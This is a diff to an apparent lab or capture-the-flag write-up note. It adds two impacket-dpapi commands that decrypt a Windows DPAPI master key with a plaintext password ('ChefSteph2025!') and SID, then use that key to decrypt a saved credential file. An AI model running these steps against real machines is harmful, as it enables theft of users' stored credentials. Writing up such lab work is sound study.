@@ -31,3 +31,18 @@ C:\Users\$USER\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1107
 ```
 
 we need to get both in order to decrypt them.
+
+---
+
+1.
+```bash
+impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid $SID
+```
+![[Pasted image 20250711002422.png]]
+
+2.
+```bash
+impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key <the_decreypted_key>
+```
+![[Pasted image 20250711002813.png]]
+
